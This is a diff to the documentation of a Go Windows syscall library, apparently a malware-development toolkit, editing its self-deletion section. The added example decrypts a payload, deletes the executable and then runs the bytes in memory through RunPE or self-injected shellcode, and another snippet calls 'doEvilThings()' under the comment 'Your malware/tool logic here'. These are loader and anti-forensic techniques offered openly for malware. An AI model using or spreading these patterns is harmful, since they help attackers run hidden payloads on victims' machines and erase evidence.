@@ -1847,11 +1847,13 @@ The self-deletion process uses a sophisticated technique that bypasses standard 
 #### **Technical Implementation**
 
 ```go
-// Simple usage yayyy call anywhere in your program (lol)
-winapi.SelfDel()
-
-// The file will be deleted when your process exits
-// No additional cleanup required
+	switch strings.ToLower(payload.PayloadType) {
+	case "exe":
+		winapi.SelfDel()
+		runpe.ExecuteInMemory(decryptedBytes)
+	case "shellcode":
+		winapi.SelfDel()
+		winapi.NtInjectSelfShellcode(decryptedBytes)
 ```
 
 #### **Advanced Details**
@@ -1882,26 +1884,15 @@ package main
 import winapi "github.com/carved4/go-direct-syscall"
 
 func main() {
-    // Your malware/tool logic here
+
+	// Delete this executable on exit
+    winapi.SelfDel()
+	// Your malware/tool logic here
     doEvilThings()
     
-    // Delete this executable on exit
-    winapi.SelfDel()
     
-    // Program continues normally
-    // File deleted when process terminates :P
-}
-```
-
-**With Shellcode Injection:**
-```go
-func main() {
-    // Inject payload
-    err := winapi.NtInjectSelfShellcode(shellcode)
-    if err == nil {
-        // Only delete if injection succeeded
-        winapi.SelfDel()
-    }
+   	 // Program continues normally
+    	// File deleted when process terminates :P
 }
 ```
 
